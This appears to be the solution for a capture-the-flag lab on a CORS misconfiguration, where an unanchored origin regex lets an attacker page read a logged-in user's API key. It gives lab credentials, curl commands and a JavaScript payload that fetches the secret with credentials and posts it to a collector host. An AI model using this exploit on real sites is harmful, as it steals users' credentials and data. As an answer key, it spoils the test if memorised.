# CORS — WeakOriginRegex · Paynest (difficulty: medium)

`GET /api/secret` (login required) returns `{username, api_key, balance}`. Its CORS allowlist was meant to permit only the app's own origin (`http://victim.target.lab:8119`) but is implemented with the unanchored regex `/^https?:\/\/victim([a-z0-9.-]*)?\.target\.lab/`: the end is never anchored (port and any suffix pass) and any `[a-z0-9.-]` junk may sit between the leading `victim` label and `.target.lab`. An origin like `http://victim-evil.target.lab:8119` therefore matches and is reflected into `Access-Control-Allow-Origin` with credentials. In this lab any `*.target.lab` host except victim/attacker/collector/mail routes to **your** exploit server (wildcard DNS), so you can actually serve a page from a matching origin.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`.
2. Study the regex (it is quoted on the dashboard / SEC-102) and craft a matching attacker origin, e.g. `http://victim-evil.target.lab:8119`.
3. Confirm: `curl -si -b "sid=<sid>" -H "Origin: http://victim-evil.target.lab:8119" http://victim.target.lab:8119/api/secret` → ACAO echoes it (plain `http://attacker.target.lab:8119` is rejected).
4. Store the artifact at `PUT http://victim-evil.target.lab:8119/pages/exploit.html` (same page store, matching origin): `fetch('http://victim.target.lab:8119/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://collector.target.lab:8119/collect',{method:'POST',body:d}))`.
5. Trigger the bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/api/secret","origin":"http://victim-evil.target.lab:8119","referer":"http://victim-evil.target.lab:8119/pages/exploit.html"}'`
6. `curl http://collector.target.lab:8119/verify` → flag.

Flag: `DSLTV{CORS-WeakOriginRegex-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
